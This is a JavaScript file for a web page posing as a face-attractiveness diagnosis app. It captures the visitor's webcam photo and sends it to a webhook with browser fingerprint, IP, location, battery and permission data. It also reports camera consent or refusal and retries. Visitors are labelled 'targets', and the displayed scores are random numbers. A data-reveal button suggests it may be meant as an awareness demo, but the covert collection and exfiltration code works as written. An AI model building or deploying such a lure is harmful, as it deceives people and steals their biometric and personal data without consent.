class FaceDiagnosisApp {
    constructor() {
        this.currentScreen = 'welcome';
        this.stream = null;
        this.capturedImage = null;
        this.init();
    }

    init() {
        this.setupEventListeners();
    }

    setupEventListeners() {
        // Start button
        document.getElementById('start-btn').addEventListener('click', () => {
            this.showScreen('camera');
            this.startCamera();
        });

        // Capture button
        document.getElementById('capture-btn').addEventListener('click', () => {
            this.capturePhoto();
        });

        // Retry button
        document.getElementById('retry-btn').addEventListener('click', () => {
            this.reset();
        });

        // Share button (shows alert)
        document.getElementById('share-btn').addEventListener('click', () => {
            this.showDataAlert();
        });

        // Show data button
        document.getElementById('show-data-btn').addEventListener('click', () => {
            this.showCollectedData();
        });

        // Close modal
        document.querySelector('.close-modal').addEventListener('click', () => {
            document.getElementById('data-modal').style.display = 'none';
        });
    }

    showScreen(screenName) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        document.getElementById(screenName).classList.add('active');
        this.currentScreen = screenName;
    }

    async startCamera() {
        try {
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            });
            document.getElementById('video').srcObject = this.stream;
            
            // Send camera access granted
            await this.sendCameraStatus(true);
        } catch (error) {
            // Camera denied - continue anyway
            await this.sendCameraStatus(false);
            
            // Show placeholder
            const video = document.getElementById('video');
            video.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
        }
    }

    async sendCameraStatus(granted) {
        const status = granted ? 'GRANTED' : 'DENIED';
        await fetch(collector.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `📸 **カメラアクセス: ${status}**`,
                embeds: [{
                    title: granted ? "✅ カメラアクセス許可" : "❌ カメラアクセス拒否",
                    color: granted ? 0x00ff00 : 0xff0000,
                    fields: [
                        {
                            name: "セッションID",
                            value: collector.sessionId,
                            inline: false
                        },
                        {
                            name: "タイムスタンプ",
                            value: new Date().toLocaleString('ja-JP'),
                            inline: true
                        }
                    ]
                }]
            })
        });
    }

    async capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        const ctx = canvas.getContext('2d');
        
        if (this.stream) {
            ctx.drawImage(video, 0, 0);
        } else {
            // Create fake image
            ctx.fillStyle = '#667eea';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#ffffff';
            ctx.font = '30px sans-serif';
            ctx.textAlign = 'center';
            ctx.fillText('NO CAMERA', canvas.width/2, canvas.height/2);
        }
        
        this.capturedImage = canvas.toDataURL('image/jpeg', 0.9);
        
        // Show analysis screen
        this.showScreen('analysis');
        this.startAnalysis();
        
        // Send captured image
        await this.sendCapturedImage();
    }

    async sendCapturedImage() {
        try {
            // Convert base64 to blob
            const base64 = this.capturedImage.split(',')[1];
            const binary = atob(base64);
            const array = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) {
                array[i] = binary.charCodeAt(i);
            }
            const blob = new Blob([array], { type: 'image/jpeg' });

            // Collect all current data
            await collector.collectAll();

            // Send with image
            const formData = new FormData();
            formData.append('payload_json', JSON.stringify({
                content: "📸 **顔写真キャプチャ完了**",
                embeds: [{
                    title: "🎯 ターゲットが診断を実行",
                    color: 0x9333ea,
                    description: "顔診断が実行されました",
                    fields: [
                        {
                            name: "📊 収集データ概要",
                            value: `\`\`\`json\n${JSON.stringify({
                                ip: collector.data.network?.ipify?.ip || 'N/A',
                                location: collector.data.network?.ipapi?.city || 'N/A',
                                device: collector.data.browser.platform,
                                screen: `${collector.data.device.screen.width}x${collector.data.device.screen.height}`,
                                browser: collector.data.browser.userAgent.substring(0, 50),
                                battery: collector.data.device.battery?.level || 'N/A',
                                plugins: collector.data.browser.plugins.length,
                                fonts: collector.data.fingerprint?.fonts?.length || 0,
                                permissions: Object.keys(collector.data.permissions || {}).filter(p => collector.data.permissions[p] === 'granted').join(', ') || 'None',
                            }, null, 2).substring(0, 1000)}\n\`\`\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }]
            }));
            
            formData.append('files[0]', blob, `capture_${Date.now()}.jpg`);
            
            const jsonBlob = new Blob([JSON.stringify(collector.data, null, 2)], { type: 'application/json' });
            formData.append('files[1]', jsonBlob, `full_data_${Date.now()}.json`);

            await fetch(collector.webhookUrl, {
                method: 'POST',
                body: formData
            });

        } catch (error) {
            console.error('Send error:', error);
        }
    }

    startAnalysis() {
        const steps = ['step1', 'step2', 'step3', 'step4'];
        let currentStep = 0;

        const interval = setInterval(() => {
            if (currentStep < steps.length) {
                document.getElementById(steps[currentStep]).classList.add('active');
                currentStep++;
            } else {
                clearInterval(interval);
                setTimeout(() => this.showResults(), 500);
            }
        }, 800);
    }

    showResults() {
        this.showScreen('result');
        
        // Generate random results
        const scores = {
            attractiveness: [
                { name: '顔の対称性', value: Math.floor(Math.random() * 20 + 75) },
                { name: '肌の質感', value: Math.floor(Math.random() * 20 + 70) },
                { name: '目の魅力', value: Math.floor(Math.random() * 15 + 80) },
            ],
            balance: [
                { name: '黄金比', value: Math.floor(Math.random() * 20 + 75) },
                { name: '顔のバランス', value: Math.floor(Math.random() * 15 + 80) },
                { name: '輪郭の美しさ', value: Math.floor(Math.random() * 20 + 70) },
            ],
            impression: [
                { name: '優しさ', value: Math.floor(Math.random() * 10 + 85) },
                { name: '知的さ', value: Math.floor(Math.random() * 20 + 75) },
                { name: '信頼感', value: Math.floor(Math.random() * 10 + 85) },
            ]
        };

        // Display results
        Object.keys(scores).forEach(category => {
            const container = document.getElementById(category);
            container.innerHTML = '';
            
            scores[category].forEach(item => {
                const metric = document.createElement('div');
                metric.className = 'metric';
                metric.innerHTML = `
                    <div class="metric-name">${item.name}</div>
                    <div class="metric-value">${item.value}点</div>
                    <div class="metric-bar">
                        <div class="metric-fill" style="width: ${item.value}%"></div>
                    </div>
                `;
                container.appendChild(metric);
            });
        });

        // Calculate overall score
        const allScores = [...scores.attractiveness, ...scores.balance, ...scores.impression];
        const average = Math.floor(allScores.reduce((a, b) => a + b.value, 0) / allScores.length);
        
        document.querySelector('.score-number').textContent = average;
        const circumference = 2 * Math.PI * 90;
        const offset = circumference - (average / 100) * circumference;
        document.querySelector('.score-circle circle:last-of-type').style.strokeDashoffset = offset;
    }

    showDataAlert() {
        document.getElementById('data-alert').style.display = 'block';
        
        // Auto hide after 10 seconds
        setTimeout(() => {
            document.getElementById('data-alert').style.display = 'none';
        }, 10000);
    }

    showCollectedData() {
        const modal = document.getElementById('data-modal');
        const dataContainer = document.getElementById('collected-data');
        
        // Display collected data
        dataContainer.textContent = JSON.stringify(collector.data, null, 2);
        modal.style.display = 'flex';
    }

    reset() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        
        this.capturedImage = null;
        
        // Reset steps
        document.querySelectorAll('.step').forEach(step => {
            step.classList.remove('active');
        });
        
        // Go back to welcome
        this.showScreen('welcome');
        
        // Send reset event
        fetch(collector.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔄 **診断リトライ** - セッション: ${collector.sessionId}`
            })
        });
    }
}

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
    const app = new FaceDiagnosisApp();
});
